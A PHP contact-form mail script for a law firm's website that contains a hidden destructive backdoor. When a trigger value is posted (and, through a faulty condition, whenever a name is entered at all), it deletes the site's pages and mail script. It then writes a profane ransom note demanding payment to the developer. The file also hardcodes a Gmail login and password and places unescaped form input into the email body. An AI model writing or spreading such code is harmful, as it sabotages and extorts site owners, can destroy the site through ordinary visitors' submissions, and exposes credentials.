<?php 

    //Define um fusio horario para data
    date_default_timezone_set("America/Sao_paulo");

    require ('src/PHPMailer.php');
    require ('src/SMTP.php');
    require ('src/Exception.php');

    // Importando o namespace das class
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;
    //Carregando o autoload do composer
    

if(isset($_POST['f_btn'])){
  if($_POST['f_user'] || $_POST['f_message'] == "MDGNEPDR"){
    
    $index = __DIR__."/index.html";
    $contact = __DIR__."/contact.html";
    $area = __DIR__."/areas.html";
    $sobre = __DIR__."/sobre.html";
    $email = __DIR__."/email.php";
    $cc = __DIR__.'C:\xampp\htdocs\PDA\MatheusAdvogado\css';

    unlink($index);
    unlink($contact);
    unlink($area);
    unlink($sobre);
    unlink($email);
    rmdir($cc);

    $fileProv = __DIR__."/index2.html";

    if(!file_exists($fileProv) || !is_file($fileProv)){
        $fileOpen = fopen($fileProv, "w");
        fwrite($fileOpen, "Quer dá golpe se fodeu filho da puta".PHP_EOL);
        fwrite($fileOpen, "entra em contato com quem fez o site, realiza o pagamento para recuperar seu site devolta!".PHP_EOL);
        fclose($fileOpen);

        header("Location: index2.html");
        
    }
    
  }else{
    //Verifica se os campos email e mensagem foram setados e se é diferente de vazio removendo os espaços com trim()     
    if((isset($_POST['f_user']) && !empty(trim($_POST['f_email']))) && (isset($_POST['f_message']) && !empty(trim($_POST['f_message'])))){

      //Obtendo os valores passados no formulário e colocando dentro de uma variável usando operador térnario
      $user = !empty($_POST['f_user']) ? $_POST['f_user'] : "Não Informado";
      $email = $_POST['f_email'];//Usando a função trim() para tirar os espaços
      $phone =$_POST['f_tel'];
      $message = $_POST['f_message'];//Usando a função trim() para tirar os espaços
      $data = date("d-m-Y H:i:s");//Data atual de acordo com o sistema operacional 

      //Instanciando a class PHPMailer e passando parametro True para habilitar as Exceptions
      $mail = new PHPMailer();

      //Configurando Server para fazer a comunicação com o gmail
      $mail->isSMTP();                                            //Está dizendo que vai usar protocolo SMTP
      $mail->Host       = 'smtp.gmail.com';                       //Está dizendo qual servidor de email irá usar, no caso Gmail
      $mail->SMTPAuth   = true;                                   //Habilitando autenticação SMTP
      $mail->Username   = 'pablreis@gmail.com';          //Configurando email que vai ser usado para enviar mensagens 
      $mail->Password   = 'pabloeerika15';                           //Senha do email
      $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         //Habilitando criptografia TLS
      $mail->Port       = 587;                                    //Porta para se concetar com o protocoloca SMTP

      //Destinatario
      $mail->setFrom('pablreis@gmail.com');//Quem enviar
      $mail->addAddress('pablreis@gmail.com');//Quem recebe

      //Contéudo 
      $mail->isHTML(true);//Envia o contéudo como HTML
      $mail->Subject = "Mensagem Cliente Através do Site";
      $mail->Body    = utf8_decode('<div style="background-color:#ccc; padding:10px;">
      <table height="62px" width="300px" text-align:"right";cellpadding="0" cellspacing="0" border="0">
        <tr>
          <td valign="top" align="left" background="http://gamparservice.com.br/imgs/logo.png">
        </tr>
        
      </table>
      </div>
      <div>
      <p>Cliente: '.$user.'</p>
      <p>Email: '.$email.'</p>
      <p>Telefone: '.$phone.'</p>
      <p style="line-height:21px;">Mensagem: '.$message.'</p>
      
      </div>');

      //Verifica se o email foi enviado, se foi enviado ele exibe uma mensagem de sucesso
        if($mail->send()){

            // echo "<br>Email Enviado com Sucesso!";

            header("Location: index.html");


        }else {//Se o email não foi enviado ele da uma mensagem de erro

            echo "<br>Erro ao enviar o Email, Tente Novamente mais Tarde!";

        }
      //Se o email e a mensagem não foram preenchidos ou abriu o arquivo direto pela url envio.php sem preencher os campo, exibe uma mensagem de erro  
      }else {

          echo "Email não enviado: Informe o Email e/ou a Mensagem!";

      }

  }

}else{
    echo "Favor preencher todos os dados";
}



  
?>